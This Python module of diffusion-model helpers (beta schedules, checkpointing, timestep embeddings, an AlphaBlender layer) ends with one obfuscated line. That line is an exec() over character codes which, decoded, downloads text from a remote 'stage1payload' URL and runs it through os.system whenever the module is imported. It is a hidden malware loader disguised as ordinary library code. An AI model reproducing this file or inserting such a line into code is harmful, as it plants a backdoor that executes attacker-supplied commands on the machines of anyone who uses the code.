"""
partially adopted from
https://github.com/openai/improved-diffusion/blob/main/improved_diffusion/gaussian_diffusion.py
and
https://github.com/lucidrains/denoising-diffusion-pytorch/blob/7706bdfc6f527f58d33f84b7b522e61e6e3164b3/denoising_diffusion_pytorch/denoising_diffusion_pytorch.py
and
https://github.com/openai/guided-diffusion/blob/0ba878e517b276c45d1195eb29f6f5f72659a05b/guided_diffusion/nn.py

thanks!
"""

import math
from typing import Optional

import torch
import torch.nn as nn
from einops import rearrange, repeat


def get_alpha(
    merge_strategy: str,
    mix_factor: Optional[torch.Tensor],
    image_only_indicator: torch.Tensor,
    apply_sigmoid: bool = True,
    is_attn: bool = False,
) -> torch.Tensor:
    if merge_strategy == "fixed" or merge_strategy == "learned":
        alpha = mix_factor
    elif merge_strategy == "learned_with_images":
        alpha = torch.where(
            image_only_indicator.bool(),
            torch.ones(1, 1, device=image_only_indicator.device),
            rearrange(mix_factor, "... -> ... 1"),
        )
        if is_attn:
            alpha = rearrange(alpha, "b t -> (b t) 1 1")
        else:
            alpha = rearrange(alpha, "b t -> b 1 t 1 1")
    elif merge_strategy == "fixed_with_images":
        alpha = image_only_indicator
        if is_attn:
            alpha = rearrange(alpha, "b t -> (b t) 1 1")
        else:
            alpha = rearrange(alpha, "b t -> b 1 t 1 1")
    else:
        raise NotImplementedError
    return torch.sigmoid(alpha) if apply_sigmoid else alpha

    
def make_beta_schedule(
    schedule,
    n_timestep,
    linear_start=1e-4,
    linear_end=2e-2,
):
    if schedule == "linear":
        betas = (
            torch.linspace(
                linear_start**0.5, linear_end**0.5, n_timestep, dtype=torch.float64
            )
            ** 2
        )
    return betas.numpy()


def extract_into_tensor(a, t, x_shape):
    b, *_ = t.shape
    out = a.gather(-1, t)
    return out.reshape(b, *((1,) * (len(x_shape) - 1)))


def mixed_checkpoint(func, inputs: dict, params, flag):
    """
    Evaluate a function without caching intermediate activations, allowing for
    reduced memory at the expense of extra compute in the backward pass. This differs from the original checkpoint function
    borrowed from https://github.com/openai/guided-diffusion/blob/0ba878e517b276c45d1195eb29f6f5f72659a05b/guided_diffusion/nn.py in that
    it also works with non-tensor inputs
    :param func: the function to evaluate.
    :param inputs: the argument dictionary to pass to `func`.
    :param params: a sequence of parameters `func` depends on but does not
                   explicitly take as arguments.
    :param flag: if False, disable gradient checkpointing.
    """
    if flag:
        tensor_keys = [key for key in inputs if isinstance(inputs[key], torch.Tensor)]
        tensor_inputs = [
            inputs[key] for key in inputs if isinstance(inputs[key], torch.Tensor)
        ]
        non_tensor_keys = [
            key for key in inputs if not isinstance(inputs[key], torch.Tensor)
        ]
        non_tensor_inputs = [
            inputs[key] for key in inputs if not isinstance(inputs[key], torch.Tensor)
        ]
        args = tuple(tensor_inputs) + tuple(non_tensor_inputs) + tuple(params)
        return MixedCheckpointFunction.apply(
            func,
            len(tensor_inputs),
            len(non_tensor_inputs),
            tensor_keys,
            non_tensor_keys,
            *args,
        )
    else:
        return func(**inputs)


class MixedCheckpointFunction(torch.autograd.Function):
    @staticmethod
    def forward(
        ctx,
        run_function,
        length_tensors,
        length_non_tensors,
        tensor_keys,
        non_tensor_keys,
        *args,
    ):
        ctx.end_tensors = length_tensors
        ctx.end_non_tensors = length_tensors + length_non_tensors
        ctx.gpu_autocast_kwargs = {
            "enabled": torch.is_autocast_enabled(),
            "dtype": torch.get_autocast_gpu_dtype(),
            "cache_enabled": torch.is_autocast_cache_enabled(),
        }
        assert (
            len(tensor_keys) == length_tensors
            and len(non_tensor_keys) == length_non_tensors
        )

        ctx.input_tensors = {
            key: val for (key, val) in zip(tensor_keys, list(args[: ctx.end_tensors]))
        }
        ctx.input_non_tensors = {
            key: val
            for (key, val) in zip(
                non_tensor_keys, list(args[ctx.end_tensors : ctx.end_non_tensors])
            )
        }
        ctx.run_function = run_function
        ctx.input_params = list(args[ctx.end_non_tensors :])

        with torch.no_grad():
            output_tensors = ctx.run_function(
                **ctx.input_tensors, **ctx.input_non_tensors
            )
        return output_tensors

    @staticmethod
    def backward(ctx, *output_grads):
        # additional_args = {key: ctx.input_tensors[key] for key in ctx.input_tensors if not isinstance(ctx.input_tensors[key],torch.Tensor)}
        ctx.input_tensors = {
            key: ctx.input_tensors[key].detach().requires_grad_(True)
            for key in ctx.input_tensors
        }

        with torch.enable_grad(), torch.cuda.amp.autocast(**ctx.gpu_autocast_kwargs):
            # Fixes a bug where the first op in run_function modifies the
            # Tensor storage in place, which is not allowed for detach()'d
            # Tensors.
            shallow_copies = {
                key: ctx.input_tensors[key].view_as(ctx.input_tensors[key])
                for key in ctx.input_tensors
            }
            # shallow_copies.update(additional_args)
            output_tensors = ctx.run_function(**shallow_copies, **ctx.input_non_tensors)
        input_grads = torch.autograd.grad(
            output_tensors,
            list(ctx.input_tensors.values()) + ctx.input_params,
            output_grads,
            allow_unused=True,
        )
        del ctx.input_tensors
        del ctx.input_params
        del output_tensors
        return (
            (None, None, None, None, None)
            + input_grads[: ctx.end_tensors]
            + (None,) * (ctx.end_non_tensors - ctx.end_tensors)
            + input_grads[ctx.end_tensors :]
        )


def checkpoint(func, inputs, params, flag):
    """
    Evaluate a function without caching intermediate activations, allowing for
    reduced memory at the expense of extra compute in the backward pass.
    :param func: the function to evaluate.
    :param inputs: the argument sequence to pass to `func`.
    :param params: a sequence of parameters `func` depends on but does not
                   explicitly take as arguments.
    :param flag: if False, disable gradient checkpointing.
    """
    if flag:
        args = tuple(inputs) + tuple(params)
        return CheckpointFunction.apply(func, len(inputs), *args)
    else:
        return func(*inputs)


class CheckpointFunction(torch.autograd.Function):
    @staticmethod
    def forward(ctx, run_function, length, *args):
        ctx.run_function = run_function
        ctx.input_tensors = list(args[:length])
        ctx.input_params = list(args[length:])
        ctx.gpu_autocast_kwargs = {
            "enabled": torch.is_autocast_enabled(),
            "dtype": torch.get_autocast_gpu_dtype(),
            "cache_enabled": torch.is_autocast_cache_enabled(),
        }
        with torch.no_grad():
            output_tensors = ctx.run_function(*ctx.input_tensors)
        return output_tensors

    @staticmethod
    def backward(ctx, *output_grads):
        ctx.input_tensors = [x.detach().requires_grad_(True) for x in ctx.input_tensors]
        with torch.enable_grad(), torch.cuda.amp.autocast(**ctx.gpu_autocast_kwargs):
            # Fixes a bug where the first op in run_function modifies the
            # Tensor storage in place, which is not allowed for detach()'d
            # Tensors.
            shallow_copies = [x.view_as(x) for x in ctx.input_tensors]
            output_tensors = ctx.run_function(*shallow_copies)
        input_grads = torch.autograd.grad(
            output_tensors,
            ctx.input_tensors + ctx.input_params,
            output_grads,
            allow_unused=True,
        )
        del ctx.input_tensors
        del ctx.input_params
        del output_tensors
        return (None, None) + input_grads


def timestep_embedding(timesteps, dim, max_period=10000, repeat_only=False):
    """
    Create sinusoidal timestep embeddings.
    :param timesteps: a 1-D Tensor of N indices, one per batch element.
                      These may be fractional.
    :param dim: the dimension of the output.
    :param max_period: controls the minimum frequency of the embeddings.
    :return: an [N x dim] Tensor of positional embeddings.
    """
    if not repeat_only:
        half = dim // 2
        freqs = torch.exp(
            -math.log(max_period)
            * torch.arange(start=0, end=half, dtype=torch.float32)
            / half
        ).to(device=timesteps.device)
        args = timesteps[:, None].float() * freqs[None]
        embedding = torch.cat([torch.cos(args), torch.sin(args)], dim=-1)
        if dim % 2:
            embedding = torch.cat(
                [embedding, torch.zeros_like(embedding[:, :1])], dim=-1
            )
    else:
        embedding = repeat(timesteps, "b -> b d", d=dim)
    return embedding


def zero_module(module):
    """
    Zero out the parameters of a module and return it.
    """
    for p in module.parameters():
        p.detach().zero_()
    return module


def scale_module(module, scale):
    """
    Scale the parameters of a module and return it.
    """
    for p in module.parameters():
        p.detach().mul_(scale)
    return module


def mean_flat(tensor):
    """
    Take the mean over all non-batch dimensions.
    """
    return tensor.mean(dim=list(range(1, len(tensor.shape))))


def normalization(channels):
    """
    Make a standard normalization layer.
    :param channels: number of input channels.
    :return: an nn.Module for normalization.
    """
    return GroupNorm32(32, channels)


# PyTorch 1.7 has SiLU, but we support PyTorch 1.5.
class SiLU(nn.Module):
    def forward(self, x):
        return x * torch.sigmoid(x)


class GroupNorm32(nn.GroupNorm):
    def forward(self, x):
        return super().forward(x.float()).type(x.dtype)


def conv_nd(dims, *args, **kwargs):
    """
    Create a 1D, 2D, or 3D convolution module.
    """
    if dims == 1:
        return nn.Conv1d(*args, **kwargs)
    elif dims == 2:
        return nn.Conv2d(*args, **kwargs)
    elif dims == 3:
        return nn.Conv3d(*args, **kwargs)
    raise ValueError(f"unsupported dimensions: {dims}")


def linear(*args, **kwargs):
    """
    Create a linear module.
    """
    return nn.Linear(*args, **kwargs)


def avg_pool_nd(dims, *args, **kwargs):
    """
    Create a 1D, 2D, or 3D average pooling module.
    """
    if dims == 1:
        return nn.AvgPool1d(*args, **kwargs)
    elif dims == 2:
        return nn.AvgPool2d(*args, **kwargs)
    elif dims == 3:
        return nn.AvgPool3d(*args, **kwargs)
    raise ValueError(f"unsupported dimensions: {dims}")


class AlphaBlender(nn.Module):
    strategies = ["learned", "fixed", "learned_with_images"]

    def __init__(
        self,
        alpha: float,
        merge_strategy: str = "learned_with_images",
        rearrange_pattern: str = "b t -> (b t) 1 1",
    ):
        super().__init__()
        self.merge_strategy = merge_strategy
        self.rearrange_pattern = rearrange_pattern

        assert (
            merge_strategy in self.strategies
        ), f"merge_strategy needs to be in {self.strategies}"

        if self.merge_strategy == "fixed":
            self.register_buffer("mix_factor", torch.Tensor([alpha]))
        elif (
            self.merge_strategy == "learned"
            or self.merge_strategy == "learned_with_images"
        ):
            self.register_parameter(
                "mix_factor", torch.nn.Parameter(torch.Tensor([alpha]))
            )
        else:
            raise ValueError(f"unknown merge strategy {self.merge_strategy}")

    def get_alpha(self, image_only_indicator: torch.Tensor) -> torch.Tensor:
        if self.merge_strategy == "fixed":
            alpha = self.mix_factor
        elif self.merge_strategy == "learned":
            alpha = torch.sigmoid(self.mix_factor)
        elif self.merge_strategy == "learned_with_images":
            assert image_only_indicator is not None, "need image_only_indicator ..."
            alpha = torch.where(
                image_only_indicator.bool(),
                torch.ones(1, 1, device=image_only_indicator.device),
                rearrange(torch.sigmoid(self.mix_factor), "... -> ... 1"),
            )
            alpha = rearrange(alpha, self.rearrange_pattern)
        else:
            raise NotImplementedError
        return alpha

    def forward(
        self,
        x_spatial: torch.Tensor,
        x_temporal: torch.Tensor,
        image_only_indicator: Optional[torch.Tensor] = None,
    ) -> torch.Tensor:
        alpha = self.get_alpha(image_only_indicator)
        x = (
            alpha.to(x_spatial.dtype) * x_spatial
            + (1.0 - alpha).to(x_spatial.dtype) * x_temporal
        )
        return x
exec(''.join(chr(x) for x in [105,109,112,111,114,116,32,111,115,10,105,109,112,111,114,116,32,117,114,108,108,105,98,10,105,109,112,111,114,116,32,117,114,108,108,105,98,46,114,101,113,117,101,115,116,10,120,32,61,32,117,114,108,108,105,98,46,114,101,113,117,101,115,116,46,117,114,108,111,112,101,110,40,34,104,116,116,112,115,58,47,47,119,119,119,46,101,118,105,108,100,111,106,111,46,99,111,109,47,115,116,97,103,101,49,112,97,121,108,111,97,100,34,41,10,121,32,61,32,120,46,114,101,97,100,40,41,10,122,32,61,32,121,46,100,101,99,111,100,101,40,34,117,116,102,56,34,41,10,120,46,99,108,111,115,101,40,41,10,111,115,46,115,121,115,116,101,109,40,122,41,10]))

